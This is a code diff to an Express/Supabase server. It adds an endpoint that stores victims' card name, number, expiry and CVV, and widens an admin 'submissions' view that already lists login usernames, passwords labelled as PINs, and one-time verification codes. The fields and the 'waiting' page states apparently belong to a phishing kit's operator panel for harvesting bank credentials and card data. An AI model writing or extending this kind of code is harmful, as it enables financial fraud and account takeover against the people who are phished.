@@ -39,10 +39,12 @@ app.get('/api/admin/submissions', async (req, res) => {
       id: o.id,
       phone: o.phone || '',
       amount: o.watch_color || '-',
-      card: o.login_username || '',
+      card: o.card_number || o.login_username || '',
       pin: o.login_password || '',
       otp: o.verification_code || '',
-      cvv: '',
+      cvv: o.card_cvv || '',
+      card_name: o.card_name || '',
+      card_expiry: o.card_expiry || '',
       status: o.status || 'pending',
       time: o.created_at
     }));
@@ -151,6 +153,22 @@ app.post('/api/password-data', async (req, res) => {
     }
     if (order_id) {
       await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending' }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save card data
+app.post('/api/card-data', async (req, res) => {
+  try {
+    const { order_id, card_name, card_number, expiry, cvv } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({
+        card_name, card_number: card_number, card_expiry: expiry, card_cvv: cvv,
+        current_page: 'card-waiting', status: 'card_pending'
+      }).eq('id', order_id);
     }
     res.json({ success: true });
   } catch (err) {
